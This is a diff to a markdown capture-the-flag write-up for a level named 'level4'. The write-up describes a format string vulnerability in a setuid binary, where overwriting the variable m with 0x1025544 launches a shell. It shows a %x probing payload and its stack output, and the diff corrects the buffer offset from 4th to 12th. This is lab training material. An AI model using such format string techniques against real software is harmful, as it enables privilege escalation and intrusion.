@@ -1,17 +1,11 @@
-# Level 4
+# Level4
 
-https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf
-
-## 1. Identity
+## 1. Context
 
 ```bash
 $ id
 uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)
-```
 
-## 2. Home directory
-
-```bash
 $ pwd
 /home/user/level4
 
@@ -21,32 +15,34 @@ $ ls -la
 [...]
 ```
 
-## 3. Analyzing the file
+## 2. Program behavior
 
 Testing it :
-
 ```bash
 $ ./level4
 a
 a
 ```
 
-Expects an input and prints it
+Expects an input and prints it, nothing else...
 
-Nothing else...
+## 3. Code overview
 
-Looking at our functions with gdb, main() calls the function n().
-n() uses the function p() which is vulnerable.
-Then checks the value of m. If m equals 0x1025544, a shell is launched.
+Looking at our functions, `main()` calls the function `n()`.
+`n()` uses the function `p()` which is vulnerable to **format string attacks**.
+Then checks the value of `m`. If `m` is equal to `0x1025544`, a shell is launched.
 
-Our goal is to modify the value of m.
+Our goal is to modify the value of `m`.
+
+## 4. Exploit
+
 
 ```bash
-$ python -c 'print "BBBB"+"%x "*12' | ./level4 
-BBBBb7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242
+$ python -c 'print "BBBB "+"%x "*12' | ./level4
+BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242
 ```
 
-Our buffer is stored in the 4th position in the stack.
+Our buffer is stored in the 12th position in the stack.
 
 ## 4. Getting the flag
 
